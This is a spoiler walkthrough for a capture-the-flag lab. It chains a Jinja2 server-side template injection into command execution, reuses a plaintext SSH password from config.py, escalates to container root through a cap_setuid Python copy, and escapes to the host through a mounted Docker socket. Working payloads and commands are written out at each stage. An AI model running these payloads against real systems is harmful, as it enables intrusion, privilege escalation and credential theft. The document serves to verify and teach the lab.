# Walkthrough (spoiler)

This is the intended solution path. It is a spoiler for maintainers and for
verifying the challenge. Do not read it if you want to play.

Target ports (default mapping): 8080 web, 22 outer-host SSH, 23 web-container
SSH.

## Stage 0 - Recon

- Browse `http://TARGET:8080/`. A form posts a `name` to `/card`.
- View source on the home page. An HTML comment warns that the card view drops
  the raw name into the template string before `render_template_string`, so the
  field is evaluated as a template.

## Stage 1 - Confirm the template injection

- Request `http://TARGET:8080/card?name={{7*7}}`.
- The rendered card greets "Template Studio, 49." rather than echoing the
  literal braces. The name is evaluated as Jinja2: Server-Side Template
  Injection.

## Stage 2 - SSTI to RCE, first inner flag (jinja)

- The Flask app runs as the unprivileged `jinja` user. Escalate the injection to
  command execution through the Jinja2 globals reachable from a builtin global,
  for example:

  ```
  /card?name={{cycler.__init__.__globals__.os.popen('id').read()}}
  ```

- Read the app user flag:

  ```
  /card?name={{cycler.__init__.__globals__.os.popen('cat /home/jinja/flag.txt').read()}}
  ```

- That prints the first `FLAG{...}` (jinja).

## Stage 3 - Reused credential to mako, second inner flag

- The app reads `config.py`, which is readable by the app user. Dump it through
  the RCE:

  ```
  /card?name={{cycler.__init__.__globals__.os.popen('cat /app/config.py').read()}}
  ```

- It contains `DEPLOY_SSH_USER = "mako"` and a plaintext `DEPLOY_SSH_PASSWORD`.
  The same password is `mako`'s system login (the reused-secret mistake).
- Log in over the web-container SSH, published on port 23:

  ```
  ssh mako@TARGET -p 23
  cat ~/flag.txt
  ```

- That prints the second `FLAG{...}` (mako).

## Stage 4 - mako to container root (cap_setuid Python)

- Enumerate file capabilities (mako's PATH does not include `/sbin`, so call
  `getcap` by full path):

  ```
  /sbin/getcap -r / 2>/dev/null
  ```

- `/usr/local/bin/pymgmt` carries `cap_setuid,cap_setgid+ep` and is owned by and
  executable only by `mako`. It is a copy of the Python interpreter, so it can
  drop to uid 0:

  ```
  /usr/local/bin/pymgmt -c 'import os; os.setgid(0); os.setuid(0); os.system("/bin/bash")'
  ```

- Read the inner-root flag:

  ```
  cat /root/root.txt
  ```

- That prints the `TEMPLATE_FLAG{...}` (web-container root).

## Stage 5 - Container root to outer host, both MAIN_FLAGs

- As root in the web container, note that `/var/run/docker.sock` is mounted from
  the outer host, and a static `docker` client is present.
- Launch a container that mounts the outer host filesystem and read the outer
  root flag plus the deploy credential file:

  Use an image the outer engine already holds from the inner build
  (`python:3.12-slim-bookworm`, the inner web base) so the breakout needs no
  network at solve time:

  ```bash
  docker run --rm -v /:/host python:3.12-slim-bookworm cat /host/root/root.txt
  docker run --rm -v /:/host python:3.12-slim-bookworm cat /host/root/deploy.env
  ```

- `/host/root/root.txt` is the outer-root `MAIN_FLAG{...}`.
- The socket mount also reads the outer user flag directly
  (`cat /host/home/webdev/user.txt`); the credential-reuse route below is the
  intended, in-theme path rather than the only one (see Notes).
- `/host/root/deploy.env` discloses `webdev`'s SSH password. Use it to log in on
  the outer-host SSH, published on port 22, and read the outer user flag:

  ```bash
  ssh webdev@TARGET -p 22
  cat ~/user.txt
  ```

- That prints the outer-user `MAIN_FLAG{...}`.

## Notes and red herrings

- `jinja` cannot execute `/usr/local/bin/pymgmt` (mode 0700, owned by mako), so
  the mako step cannot be skipped from the initial RCE.
- The outer `webdev` account has no path to root on the outer host; the outer
  root flag is reachable only through the mounted Docker socket, as intended.
- The mounted `docker.sock` yields outer root directly, so both outer MAIN flags
  (root and user) are readable straight off the host filesystem mount. The
  `deploy.env` recovery and SSH-as-`webdev` login are a realism flourish in
  keeping with the reused-credential theme, not a load-bearing gate: they are
  the intended path, but not the only one. Do not treat the SSH-as-`webdev` step
  as required.
- The outer `webdev` / deploy password is baked into the outer image build
  history by the `chpasswd` line in the outer `Dockerfile`, so anyone handed the
  built image (rather than a network-hosted instance) can recover it from
  `docker history`. The intended hosting model is network-only; do not
  distribute the built image. This is a known residual, recorded here so
  maintainers are not surprised by it.
